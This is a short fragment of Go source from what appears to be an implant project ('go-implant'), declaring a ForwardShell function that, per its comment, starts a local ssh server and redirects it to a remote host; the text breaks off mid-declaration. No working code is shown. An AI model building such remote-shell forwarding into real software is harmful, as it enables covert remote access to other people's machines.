package ssh

import (
	"go-implant/client/config"
	"log"
)

// ForwardShell starts ssh server on localhost and redirects it to a remote host
func ForwardShell(channel chan struct